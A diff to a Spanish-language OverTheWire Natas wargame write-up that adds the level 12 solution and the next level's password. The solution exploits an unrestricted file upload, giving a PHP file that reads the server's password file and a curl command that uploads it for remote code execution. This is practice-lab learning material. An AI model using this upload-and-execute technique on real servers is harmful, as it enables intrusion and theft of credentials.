@@ -193,4 +193,30 @@ Contraseña para Natas 12: **EAGkE8uzFTxeoTT2mMst9Xy7PX6guEng**
 
 ## Natas 12
 
-Contarseña para Bandit 13: **g8ba0olAzaSJuyS4gnmbdVVigAICLG1k** 
+**Unrestricted File Upload:** el servidor no valida correctamente la extensión de los archivos subidos, permitiendo ejecutar código PHP.
+
+
+1. Creamos un archivo `exploit.php` para leer la contraseña:
+
+```php
+<?php
+echo file_get_contents('/etc/natas_webpass/natas13');
+?>
+```
+
+2. Subimos el archivo modificando su extensión mediante `curl`:
+
+```bash
+curl -u natas12:CONTRASEÑA \ 
+-F "filename=exploit.php" \
+-F "uploadedfile=@exploit.php" \
+http://natas12.natas.labs.overthewire.org/
+```
+
+3. Accedimos a la ruta del archivo subido para ejecutar el código PHP y obtener la contraseña.
+
+Aprendimos a explotar una subida insegura de archivos para conseguir ejecución remota de código (RCE) y leer información sensible del servidor.
+
+Contarseña para Natas 13: **g8ba0olAzaSJuyS4gnmbdVVigAICLG1k** 
+
+
